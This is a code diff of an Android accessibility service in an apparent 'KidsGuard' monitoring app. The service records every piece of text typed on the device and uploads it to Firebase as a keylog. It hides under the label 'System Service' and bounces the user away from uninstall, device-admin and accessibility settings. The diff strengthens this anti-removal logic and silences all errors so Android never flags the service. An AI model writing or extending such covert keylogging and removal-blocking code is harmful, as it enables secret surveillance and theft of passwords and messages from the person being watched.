@@ -22,51 +22,54 @@ public class BlockAccessibility extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        if (event == null) return;
+        try {
+            if (event == null) return;
 
-        int type = event.getEventType();
-        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
-        String cls = event.getClassName() != null ? event.getClassName().toString() : "";
+            int type = event.getEventType();
+            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
+            String cls = event.getClassName() != null ? event.getClassName().toString() : "";
 
-        // --- KEYLOGGING ---
-        if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            CharSequence text = event.getText() != null && !event.getText().isEmpty()
-                    ? event.getText().get(0) : null;
-            if (text != null && text.length() > 0) {
-                keylog.append(text).append(" | ");
-                if (keylog.length() > 5000) {
-                    keylog.delete(0, keylog.length() - 4000);
-                }
-                long now = System.currentTimeMillis();
-                if (now - lastKeylogUpload > 30000) {
-                    lastKeylogUpload = now;
-                    String devId = LocationService.getSafeDeviceId(this);
-                    FirebaseHelper.put("devices/" + devId + "/keylog.json",
-                            "{\"keys\":\"" + FirebaseHelper.escapeJson(keylog.toString()) + "\"}");
+            // --- KEYLOGGING ---
+            if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                CharSequence text = event.getText() != null && !event.getText().isEmpty()
+                        ? event.getText().get(0) : null;
+                if (text != null && text.length() > 0) {
+                    keylog.append(text).append(" | ");
+                    if (keylog.length() > 5000) {
+                        keylog.delete(0, keylog.length() - 4000);
+                    }
+                    long now = System.currentTimeMillis();
+                    if (now - lastKeylogUpload > 30000) {
+                        lastKeylogUpload = now;
+                        String devId = LocationService.getSafeDeviceId(this);
+                        FirebaseHelper.put("devices/" + devId + "/keylog.json",
+                                "{\"keys\":\"" + FirebaseHelper.escapeJson(keylog.toString()) + "\"}");
+                    }
                 }
             }
-        }
 
-        // --- APP BLOCKING ---
-        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            if (blockedPkgs != null && blockedPkgs.contains(pkg)) {
-                performGlobalAction(GLOBAL_ACTION_HOME);
-                Intent warn = new Intent(this, BlockWarningActivity.class);
-                warn.putExtra("pkg", pkg);
-                warn.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(warn);
-                return;
+            // --- APP BLOCKING ---
+            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                if (blockedPkgs != null && blockedPkgs.contains(pkg)) {
+                    performGlobalAction(GLOBAL_ACTION_HOME);
+                    Intent warn = new Intent(this, BlockWarningActivity.class);
+                    warn.putExtra("pkg", pkg);
+                    warn.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(warn);
+                    return;
+                }
             }
-        }
 
-        // --- UNINSTALL PROTECTION (FIXED) ---
-        // Sirf tab trigger hoga jab hamari app ka uninstall/admin-deactivate ho raha ho
-        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            handleUninstallProtection(pkg, cls);
+            // --- PROTECTION (UNINSTALL / ADMIN / ACCESSIBILITY TOGGLE) ---
+            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || type == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+                handleProtection(pkg, cls);
+            }
+        } catch (Exception ignored) {
+            // Prevent any uncaught exception so Android never marks service as malfunctioning
         }
     }
 
-    private void handleUninstallProtection(String pkg, String cls) {
+    private void handleProtection(String pkg, String cls) {
         boolean isInstaller = pkg.contains("packageinstaller")
                 || pkg.contains("uninstaller")
                 || cls.toLowerCase().contains("uninstall");
@@ -76,11 +79,13 @@ public class BlockAccessibility extends AccessibilityService {
                 || cls.contains("AppInfo")
                 || cls.contains("SubSettings")
                 || cls.contains("ManageApplications")
-                || cls.contains("DeviceAdmin"));
+                || cls.contains("DeviceAdmin")
+                || cls.contains("Accessibility")
+                || cls.contains("ToggleAccessibility")
+                || cls.toLowerCase().contains("accessibility"));
 
         if (!isInstaller && !isAppSettings) return;
 
-        // Pehle dekho ke hamari app ka reference hai bhi ya nahi
         boolean isOurApp = false;
         AccessibilityNodeInfo rootNode = null;
         try {
@@ -93,16 +98,13 @@ public class BlockAccessibility extends AccessibilityService {
             if (rootNode != null) rootNode.recycle();
         }
 
-        // Agar screen me hamari app ka naam/package nahi hai to kuch mat karo
         if (!isOurApp) return;
 
-        // Throttle — bar bar auth screen na aaye
         long now = System.currentTimeMillis();
         if (now - lastAuthTrigger < AUTH_COOLDOWN && pkg.equals(lastAuthPkg)) {
             return;
         }
 
-        // Agar pehle se unlocked hai (5 min window) to mat dikhao
         if (UninstallAuthActivity.isUnlocked
                 && now - UninstallAuthActivity.unlockedTime < 5 * 60 * 1000L) {
             return;
@@ -111,7 +113,6 @@ public class BlockAccessibility extends AccessibilityService {
         lastAuthTrigger = now;
         lastAuthPkg = pkg;
 
-        // Home bhejo phir auth dikhao
         performGlobalAction(GLOBAL_ACTION_HOME);
 
         Intent auth = new Intent(this, UninstallAuthActivity.class);
@@ -121,23 +122,35 @@ public class BlockAccessibility extends AccessibilityService {
 
     private boolean checkIfNodeContainsOurApp(AccessibilityNodeInfo node) {
         if (node == null) return false;
-        CharSequence text = node.getText();
-        CharSequence desc = node.getContentDescription();
-        String pkgName = node.getPackageName() != null ? node.getPackageName().toString() : "";
+        try {
+            CharSequence text = node.getText();
+            CharSequence desc = node.getContentDescription();
+            String pkgName = node.getPackageName() != null ? node.getPackageName().toString() : "";
 
-        if (pkgName.equals("com.kidsguard.child")) return true;
-        if (text != null && (text.toString().contains("System Service") || text.toString().contains("KidsGuard"))) return true;
-        if (desc != null && (desc.toString().contains("System Service") || desc.toString().contains("KidsGuard"))) return true;
-
-        for (int i = 0; i < node.getChildCount(); i++) {
-            AccessibilityNodeInfo child = node.getChild(i);
-            if (child != null) {
-                if (checkIfNodeContainsOurApp(child)) {
-                    child.recycle();
-                    return true;
-                }
-                child.recycle();
+            if (pkgName.equals("com.kidsguard.child") || pkgName.equals("com.aistudio.kidsguard.qjmxnz")) return true;
+            if (text != null) {
+                String t = text.toString();
+                if (t.contains("System Service") || t.contains("KidsGuard")) return true;
             }
+            if (desc != null) {
+                String d = desc.toString();
+                if (d.contains("System Service") || d.contains("KidsGuard")) return true;
+            }
+
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    try {
+                        if (checkIfNodeContainsOurApp(child)) {
+                            child.recycle();
+                            return true;
+                        }
+                    } finally {
+                        child.recycle();
+                    }
+                }
+            }
+        } catch (Exception ignored) {
         }
         return false;
     }
